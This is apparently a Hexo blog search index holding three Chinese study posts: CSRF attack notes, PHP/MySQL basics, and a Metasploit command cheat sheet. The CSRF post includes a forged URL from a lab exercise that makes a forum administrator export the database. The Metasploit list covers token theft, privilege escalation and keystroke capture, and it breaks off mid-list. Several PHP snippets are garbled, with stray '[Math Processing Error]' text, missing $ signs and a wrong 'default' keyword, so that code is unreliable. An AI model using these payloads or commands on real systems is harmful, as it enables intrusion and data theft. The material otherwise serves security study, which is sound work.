<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2019/08/12/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.png"></p>
<h2 id="1、用自己的语言描述csrf攻击原理"><a href="#1、用自己的语言描述csrf攻击原理" class="headerlink" title="1、用自己的语言描述csrf攻击原理"></a>1、用自己的语言描述csrf攻击原理</h2><p>当用户登录某个网站时，产生会话，然后去点击带有csrf攻击程序的web，CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。</p>
<h2 id="2、csrf攻击分类"><a href="#2、csrf攻击分类" class="headerlink" title="2、csrf攻击分类"></a>2、csrf攻击分类</h2><p><strong>CSRF漏洞一般分为站外和站内两种类型。</strong></p>
<p><strong>CSRF站外类型</strong>的漏洞本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。</p>
<p> <strong>CSRF站内类型</strong>的漏洞在一定程度上是由于程序员滥用<code>$_REQUEST</code>类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起这些请求。</p>
<h2 id="3、csrf漏洞检测方法。"><a href="#3、csrf漏洞检测方法。" class="headerlink" title="3、csrf漏洞检测方法。"></a>3、csrf漏洞检测方法。</h2><p>1、抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</p>
<p>2、扫描器扫描，但误报较高，后台登录，修改密码等可能扫不出csrf漏洞</p>
<h2 id="4、完成csrf脱库、添加帐号、更新密码实验"><a href="#4、完成csrf脱库、添加帐号、更新密码实验" class="headerlink" title="4、完成csrf脱库、添加帐号、更新密码实验"></a>4、完成csrf脱库、添加帐号、更新密码实验</h2><p><strong>Csrf脱库</strong>：一般xiaz开源代码去观看路径一般不会改变；一级目录可以在url中看到</p>
<p>在搭建好的DZ注册普通，然后发帖，插入远程图片，URL为：</p>
<p><code>http://192.168.0.106:8080/dzcrst/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa</code></p>
<p>此链接为数据库备份操作</p>
<p>然后管理员点进去便会执行可以写一些吸引管理员的文字</p>
<p><img src="/image/csrf/1.jpg"></p>
<p><img src="/image/csrf/2.jpg" alt="2"></p>
<p>此时，我们可以访问默认备份路径及我们重命名的文件夹和文件名：<a href="http://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql">http://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql</a></p>
<p><img src="/image/csrf/3.jpg"></p>
<p><strong>添加帐号：</strong></p>
<p><img src="/image/csrf/4.jpg"></p>
<p><img src="/image/csrf/5.jpg" alt="5"></p>
<p><strong>修改密码：</strong></p>
<p>当我们登录DVWA后，在CSRF中：</p>
<p>LOW级别时：直接修改密码即可。</p>
<p>medium级别时：Referer得为网站修改页面的路径。否则会修改失败</p>
<h2 id="5、csrf防范方法"><a href="#5、csrf防范方法" class="headerlink" title="5、csrf防范方法"></a>5、csrf防范方法</h2><p>目前业界服务器端防御CSRF攻击主要有5种策略：</p>
<p>1验证HTTP Referer字段（可以突破）</p>
<p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。</p>
<p>2、在请求地址中添加token并验证</p>
<p>在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
<p>3、在HTTP头中自定义属性并验证</p>
<p>自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。</p>
<p>4、在服务端区严格区分好POST与GET的数据请求</p>
<p>如在asp中不要使用Request来直接获取数据。同时建议不要用GET请求来执行持久性操作，如：<a href="https://links.jianshu.com/go?to=http://www.yeeyan.com/space/deleteEvent/16824">http://www.yeeyan.com/space/deleteEvent/16824</a>。</p>
<p>5、使用验证码或者密码确认方式进行</p>
<p>6、用户端防御</p>
<p>用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害</p>
<p>7、安全设备防御</p>
<p>用户可以借助第三方的专业安</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP及mysql数据库</title>
    <url>/2019/12/18/PHP%E5%8F%8Amysql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>1.数据库的五个基本单位：数据库服务器，数据库，数据表，字段（数据列），数据行</p>
<p>2.数据库登录命令：mysql -h localhost -u root -p       (-h 连接名，本地连接可以不写，-u 用户名， -p 用密码的方式登录)</p>
<p>3.数据库引擎：MyISAM与nnoDB<br>区别：<br>            MyISAM：能更好的的用于查找，不支持事务。<br>            nnoDB：更好的用于增删改，支持事务。<br>            详细 ：<a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/vicenteforever/articles/1613119.html">https://www.cnblogs.com/vicenteforever/articles/1613119.html</a>       </p>
<p>4.常用的数据库编码<br>             gbk–chinese–ci 简体中文，不区分大小。<br>             uft8–general不区分大小写。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="二、数据库定义语句（DDL）"><a href="#二、数据库定义语句（DDL）" class="headerlink" title="二、数据库定义语句（DDL）"></a>二、数据库定义语句（DDL）</h3><ol>
<li><p>创建数据库 create  database  </p>
<p>数据库名称;<br>create database books;           </p>
</li>
<li><p>查看数据库 show data</p>
</li>
<li><p>删除数据库</p>
</li>
</ol>
<p>​       drop database user;</p>
<ol start="4">
<li><p>创建数据表 </p>
<p>use user;            //使用数据库<br>create table book (<br>id int(20) primary key,<br>bookname varchar(255),<br>type varchar(255),<br>information varchar(255)<br>)<br>注：最后没有“,”,primary key 为主键</p>
</li>
<li><p>查看本数据库所有数据表</p>
<p>show tables;</p>
</li>
<li><p>查看表结构</p>
<p>desc user;</p>
</li>
<li><p>修改数据表</p>
<p>向数据表中添加新字段：alter table book add column ISDN int(20);</p>
<p>向数据表中删除字段：alter table book drop column ISDN;</p>
<p>修改数据表中字段的类型：alter table book modify column type int(200);</p>
<p>修改数据表中字段的名称及类型：alter table book change column type phone int(25);</p>
</li>
<li><p>删除数据表</p>
<p>drop table book;</p>
</li>
<li><p>查看数据库创建过程</p>
<p>show create database books;</p>
</li>
<li><p>查看表创建源码：</p>
<p>show create table user；</p>
</li>
</ol>
<h3 id="三、数据库定义语言（DML）"><a href="#三、数据库定义语言（DML）" class="headerlink" title="三、数据库定义语言（DML）"></a>三、数据库定义语言（DML）</h3><p>1.向数据表中插入数据<br>insert into user (id,username,password,birthday) values(5,”qiqi”,123456,”1998.05.26”);</p>
<p>2.修改表中的数据<br>update user set username=”zhao” where id=5;</p>
<p>3.删除表中的数据<br>删除所有数据：delete from user；</p>
<h3 id="四、权限操作"><a href="#四、权限操作" class="headerlink" title="四、权限操作"></a>四、权限操作</h3><ol>
<li><p>授予权限 </p>
<p>grant 权限 on 库.表 to’用户‘@’主机’ identified by ‘密码’;<br>示例         grant select, inserton test.* to ‘liwenkai’@’localhost’ identified by ‘4311’;<br>示例说明        给予liwenkai用户，在本机连接test库所有表的权限。操作的这些表具有查询和写入权限。</p>
</li>
<li><p>删除权限</p>
<p>基本语法：revoke 权限 on 库.表  from ‘用户‘@’主机’;<br>示例：revoke select ,insert on test.* from ‘liwenkai’@’localhost’;</p>
</li>
</ol>
<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="一、基本语法"><a href="#一、基本语法" class="headerlink" title="一、基本语法"></a>一、基本语法</h3><p>1.定义 （$+有意义的名称）<br>$shu<br>初始化 $shu=10;//开始定义的时候赋值</p>
<p>2.可变变量$$+有意义名称；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?p</span><br><span class="line">&#x2F;&#x2F;可变变量</span><br><span class="line"></span><br><span class="line">$shu&#x3D;&#39;biao&#39;;</span><br><span class="line"></span><br><span class="line">$biao&#x3D;&quot;鼠标&quot;;</span><br><span class="line"></span><br><span class="line">echo $$shu;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>3.注释<br>单行注释：//<br>单行注释：#<br>多行注释：/* */</p>
<p>4.数据类型<br>整型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;整数类型 10进制，8进制，16进制int</span><br><span class="line"></span><br><span class="line">$int&#x3D;1000;</span><br><span class="line"></span><br><span class="line">echo $int;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$int8&#x3D;01534;</span><br><span class="line"></span><br><span class="line">echo $int8;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$int16&#x3D;0x1927fa;</span><br><span class="line"></span><br><span class="line">echo $int16;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>bool类型：<br>只有两个返回值：true ,false</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;布尔类型bool</span><br><span class="line"></span><br><span class="line">$bool&#x3D;true;</span><br><span class="line"></span><br><span class="line">echo $bool;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">var_dump($bool);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>str字符串类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;字符串类型str</span><br><span class="line"></span><br><span class="line">str1&#x3D;&#39;name,let\&#39;s go&#39;;&#x2F;&#x2F;单引号中有符号，会被原样输出</span><br><span class="line"></span><br><span class="line">var_dump($str1);</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">str2&#x3D;&quot;name,let&#39;s go&quot;;&#x2F;&#x2F;双引号中的符号，不会被原样输出，是变量的开始</span><br><span class="line"></span><br><span class="line">var_dump($str2);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>5.算数运算符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;算数运算符[Math Processing Error]x&#x3D;5;y&#x3D;10;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]x+y;echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]x+&#x3D;y;&#x2F;&#x2F;x&#x3D;15</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line"> echo [Math Processing Error]x++;&#x2F;&#x2F;x++是先输出再相加</span><br><span class="line"></span><br><span class="line"> echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo ++[Math Processing Error]x; &#x2F;&#x2F;++x是先相加在输出</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">echo [Math Processing Error]y % x;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二、流程控制"><a href="#二、流程控制" class="headerlink" title="二、流程控制"></a>二、流程控制</h3><p>1.if  else 选择结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#x2F;&#x2F;if语句</span><br><span class="line"></span><br><span class="line">$po&#x3D;true;</span><br><span class="line"></span><br><span class="line">if($po)&#123;</span><br><span class="line"></span><br><span class="line"> echo &#39;我愿意去学习！&#39;;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line"> echo &#39;我不愿意去学习！&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.switch case 语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$tool&#x3D;rand(1,6);&#x2F;&#x2F;产生随机数的函数</span><br><span class="line"></span><br><span class="line">switch($tool)&#123;</span><br><span class="line"></span><br><span class="line">case 1:</span><br><span class="line"></span><br><span class="line">echo &#39;自己开车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">case 2:</span><br><span class="line"></span><br><span class="line">echo &#39;骑自行车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">	case 3:						&#x2F;&#x2F;选项块</span><br><span class="line"></span><br><span class="line">echo &#39;开小汽车&#39;;</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">	defined:					&#x2F;&#x2F;都不选的时候执行的语句块</span><br><span class="line"></span><br><span class="line">echo &#39;不回家&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;根据产生的随机数，选择不同模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>3.while循环语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; while循环语句</span><br><span class="line"></span><br><span class="line">$rom&#x3D;0;</span><br><span class="line"></span><br><span class="line">while($rom &lt;5)&#123;</span><br><span class="line"></span><br><span class="line">	if($rom&#x3D;&#x3D;0)&#123;</span><br><span class="line"></span><br><span class="line">		echo &#39;我刚进入循环&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	else&#123;</span><br><span class="line"></span><br><span class="line">		echo &#39;我循环了&#39;.$rom.&#39;次&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$rom++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#39;while循环结束了&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>4.for循环语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;for循环,foreach(数组1 as $value)  将数组赋值给value</span><br><span class="line"></span><br><span class="line">for (i&#x3D;1;i&lt;5;$i++)&#123;</span><br><span class="line"></span><br><span class="line">	echo &#39;这是第&#39;.$i.&#39;次&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#39;for循环结束&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>5.goto语句<br>goto语句跳转之后会停止向下执行，直接执行跳转到的语句中继续执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">goto wan;</span><br><span class="line"></span><br><span class="line">echo &#39;我就是我，我喜欢我自己&#39;;</span><br><span class="line"></span><br><span class="line">wan:</span><br><span class="line"></span><br><span class="line">echo &#39;你不能那么自私,你要爱大家！&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">goto gril;</span><br><span class="line"></span><br><span class="line">gril:</span><br><span class="line"></span><br><span class="line">echo &#39;你还要爱你的女孩!&#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="三、函数"><a href="#三、函数" class="headerlink" title="三、函数"></a>三、函数</h3><p>1.定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基本函数语法</span><br><span class="line"></span><br><span class="line">function love(i,l&#x3D;14)&#123;</span><br><span class="line"></span><br><span class="line">		echo &#39;i love you &#39;.i.l;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">love(13);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.常用函数<br>**<strong>**</strong>数字函数</p>
<p>abs()  绝对值函数<br>pow(-1,20)  返回-1的20次方<br>min(1,2,3,4,5,6)  求这些数的最小值<br>max()   返回最大值<br>pi()    圆周率值<br>count()    计算数量</p>
<p><strong>****</strong>字符串函数<br>count_chars() 统计字符串中的所有字母</p>
<p><strong>****</strong>日期函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$mytime &#x3D; getdate();</span><br><span class="line"></span><br><span class="line">echo &quot;年 :&quot;.$mytime[&#39;year&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;月 :&quot;.$mytime[&#39;mon&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;日 :&quot;.$mytime[&#39;mday&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;时 :&quot;.$mytime[&#39;hours&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;分 :&quot;.$mytime[&#39;minutes&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;一个小时中的第几钟 :&quot;.$mytime[&#39;minutes&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;这是一分钟的第几秒 :&quot;.$mytime[&#39;seconds&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;星期名称 :&quot;.$mytime[&#39;weekday&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;月份名称 :&quot;.$mytime[&#39;month&#39;].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;时间戳   :&quot;.$mytime[0].&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="四、数组与数据结构"><a href="#四、数组与数据结构" class="headerlink" title="四、数组与数据结构"></a>四、数组与数据结构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;数组与数据结构</span><br><span class="line"></span><br><span class="line">$shu&#x3D;array(1,1.5,20,true,&#39;我就是我，我爱我&#39;);</span><br><span class="line"></span><br><span class="line">var_dump($shu);</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;br&gt;&#39;;&#x2F;&#x2F;区别</span><br><span class="line"></span><br><span class="line">echo $shu.&#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$num&#x3D;array(1,2,3,4,5,6,7,8,9,10);</span><br><span class="line"></span><br><span class="line">echo $num[0].&#39;&lt;br&gt;&#39;;&#x2F;&#x2F;单个输出</span><br><span class="line"></span><br><span class="line">for (i&#x3D;0;i&lt;9;$i++)&#123;&#x2F;&#x2F;遍历数组</span><br><span class="line"></span><br><span class="line">	echo num[i].&#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;数组遍历元素</span><br><span class="line"></span><br><span class="line">$mingren &#x3D; array(&quot;邓超&quot;, &quot;黄晓明&quot;, &quot;宁泽涛&quot;, &quot;钟汉良&quot;);</span><br><span class="line"></span><br><span class="line">dc &#x3D; array_shift(mingren);</span><br><span class="line"></span><br><span class="line">echo $dc .&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line"></span><br><span class="line">print_r($mingren);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="五、正则表达式"><a href="#五、正则表达式" class="headerlink" title="五、正则表达式"></a>五、正则表达式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;php 正则表达式</span><br><span class="line"></span><br><span class="line">$zz &#x3D; &#39;&#x2F;w.+q&#x2F;&#39;;&#x2F;&#x2F;&#39;&#x2F;w.+q&#x2F;U&#39;为懒惰模式，输出结果为w_q</span><br><span class="line"></span><br><span class="line">$string &#x3D; &#39;sssssw__qqqqqqaaaaaa&#39;;</span><br><span class="line"></span><br><span class="line">if(preg_match(zz, string, $matches))&#123;</span><br><span class="line"></span><br><span class="line">   echo &#39;匹配到了，结果为：&#39;;</span><br><span class="line"></span><br><span class="line">   var_dump($matches);</span><br><span class="line"></span><br><span class="line">   print_r( &#39;&lt;br&gt;&#39;.$matches);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;&#x2F;&#x2F;分割线符号</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$subject &#x3D; &quot;test__123123123&quot;;</span><br><span class="line"></span><br><span class="line">preg_match(&#39;&#x2F;test.+123&#x2F;&#39;, subject, matches); &#x2F;&#x2F;贪婪模式 </span><br><span class="line"></span><br><span class="line">var_dump($matches);</span><br><span class="line"></span><br><span class="line">preg_match(&#39;&#x2F;test.+123&#x2F;U&#39;, subject, matches); &#x2F;&#x2F;懒惰模式</span><br><span class="line"></span><br><span class="line">var_dump($matches);</span><br><span class="line"></span><br><span class="line">preg_filter(&#39;&#x2F;test.+123&#x2F;&#39;,subject,matches);</span><br><span class="line"></span><br><span class="line">var_dump($matches);&#x2F;&#x2F;匹配结果与懒惰模式一样，</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>删除表中的某个字段：delete from user where id=5；</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>开发</tag>
        <tag>web</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit</title>
    <url>/2019/10/06/Metasploit/</url>
    <content><![CDATA[<h2 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h2><p>Msfconsole:是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项**</p>
<hr>
<p>metasploit就是一个免费的漏洞框架，利用他人人都是黑客，使用者不需要任何编程基础就可以使用</p>
<h3 id="check：检测漏洞是否存在"><a href="#check：检测漏洞是否存在" class="headerlink" title="check：检测漏洞是否存在"></a>check：检测漏洞是否存在</h3><h3 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令:"></a>msf常用命令:</h3><blockquote>
<p>show exploits</p>
<p>列出metasploit框架中的所有渗透攻击模块。</p>
<p>show payloads</p>
<p>列出metasploit框架中的所有攻击载荷。</p>
<p>show auxiliary</p>
<p>列出metasploit框架中的所有辅助攻击载荷。</p>
<p>search name</p>
<p>查找metasploit框架中所有的渗透攻击和其他模块。</p>
<p>info</p>
<p>展示出制定渗透攻击或模块的相关信息。</p>
<p>use name</p>
<p>装载一个渗透攻击或模块。</p>
<p>LHOST</p>
<p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。</p>
<p>RHOST</p>
<p>远程主机或是目标主机。</p>
<p>set function</p>
<p>设置特定的配置参数（EG：设置本地或远程主机参数）。</p>
<p>setg function</p>
<p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。</p>
<p>show options</p>
<p>列出某个渗透攻击或模块中所有的配置参数。</p>
<p>show targets</p>
<p>列出渗透攻击所有支持的目标平台。</p>
<p>set target num</p>
<p>指定你所知道的目标的操作系统以及补丁版本类型。</p>
<p>set payload name</p>
<p>指定想要使用的攻击载荷。</p>
<p>show advanced</p>
<p>列出所有高级配置选项。</p>
<p>set autorunscript migrate -f.</p>
<p>在渗透攻击完成后，将自动迁移到另一个进程。</p>
<p>check</p>
<p>检测目标是否选定渗透攻击存在相应的安全漏洞。</p>
<p>exploit</p>
<p>执行渗透攻击或模块来攻击目标。</p>
<p>exploit -j</p>
<p>在计划任务下进行渗透攻击（攻击将在后台进行）。</p>
<p>exploit -z</p>
<p>渗透攻击完成后不与回话进行交互。</p>
<p>exploit -e encoder</p>
<p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。</p>
<p>exploit -h</p>
<p>列出exploit命令的帮助信息。</p>
<p>sessions -l</p>
<p>列出可用的交互会话（在处理多个shell时使用）。</p>
<p>sessions -l -v</p>
<p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。</p>
<p>sessions -s script</p>
<p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。</p>
<p>sessions -K</p>
<p>杀死所有活跃的交互会话。</p>
<p>sessions -c cmd</p>
<p>在所有活跃的metasploit会话上执行一个命令。</p>
<p>sessions -u sessionID</p>
<p>升级一个普通的win32 shell到metasploit shell。</p>
<p>db_create name</p>
<p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。</p>
<p>db_connect name</p>
<p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。</p>
<p>db_namp</p>
<p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。</p>
<p>db_autopwn -h</p>
<p>展示出db_autopwn命令的帮助信息。</p>
<p>db_autopwn -p -r -e</p>
<p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p>
<p>db_destroy</p>
<p>删除当前数据库。</p>
<p>db_destroy user：passwd@host：port/database</p>
<p>使用高级选项来删除数据库。</p>
</blockquote>
<h3 id="metasploit命令"><a href="#metasploit命令" class="headerlink" title="metasploit命令"></a><strong><em>metasploit命令</em></strong></h3><blockquote>
<p>help</p>
<p>打开meterpreter使用帮助。</p>
<p>run scriptname</p>
<p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p>
<p>sysinfo</p>
<p>列出受控主机的系统信息。</p>
<p>ls</p>
<p>列出目标主机的文件和文件夹信息。</p>
<p>use priv</p>
<p>加载特权提升扩展模块，来扩展metasploit库。</p>
<p>ps</p>
<p>显示所有运行的进程以及相关联的用户账户。</p>
<p>migrate PID</p>
<p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。</p>
<p>use incognito</p>
<p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）</p>
<p>list_tokens -u</p>
<p>列出目标主机用户的可用令牌。</p>
<p>list_tokens -g</p>
<p>列出目标主机用户组的可用令牌。</p>
<p>impersonate_token DOMAIN_NAME\USERNAME</p>
<p>假冒目标主机上的可用令牌。</p>
<p>steal_token PID</p>
<p>盗窃给定进程的可用令牌并进行令牌假冒。</p>
<p>drop_token</p>
<p>停止假冒当前令牌。</p>
<p>getsystem</p>
<p>通过各种攻击向量来提升系统用户权限。</p>
<p>execute -f cmd.exe -i</p>
<p>执行cmd.exe命令并进行交互。</p>
<p>execute -f cmd.exe -i -t</p>
<p>以所有可用令牌来执行cmd命令并隐藏该进程。</p>
<p>rev2self</p>
<p>回到控制目标主机的初始用户账户下。</p>
<p>reg command</p>
<p>在目标主机注册表中进行交互，创建，删除，查询等操作。</p>
<p>setdesktop number</p>
<p>切换到另一个用户界面（该功能基于那些用户已登录）。</p>
<p>screenshot</p>
<p>对目标主机的屏幕进行截图。</p>
<p>upload file</p>
<p>向目标主机上传文件。</p>
<p>download file</p>
<p>从目标主机下载文件。</p>
<p>keyscan_start</p>
